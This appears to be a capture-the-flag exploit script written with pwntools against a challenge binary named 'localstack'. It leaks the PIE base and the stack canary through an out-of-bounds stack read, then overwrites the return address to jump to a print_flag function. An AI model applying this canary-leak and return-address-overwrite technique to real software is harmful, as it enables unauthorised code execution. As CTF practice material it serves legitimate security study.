#!/usr/bin/env python3

from pwn import *

exe = ELF("./localstack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
p  =remote('172.31.1.2', 11100)

p.sendlineafter(b'>> ',b'pop')
p.sendlineafter(b'>> ',b'pop')
input()
p.sendlineafter(b'>> ',b'show')

p.recvuntil(b'Stack top: ')
exe.address = int(p.recvline()[:-1]) - 0x14ef

p.sendlineafter(b'>> ',b'push 1')
p.sendlineafter(b'>> ',b'push 29')
p.sendlineafter(b'>> ',b'show')

p.recvuntil(b'Stack top: ')
canary = int(p.recvline()[:-1])
canary = hex(canary & (2**64 -1))
canary = int(canary,16)
print(canary)

p.sendlineafter(b'>> ',b'push 0')
p.sendlineafter(b'>> ',f'push {exe.sym.print_flag}')
p.sendlineafter(b'>> ',b'exit')


p.interactive()
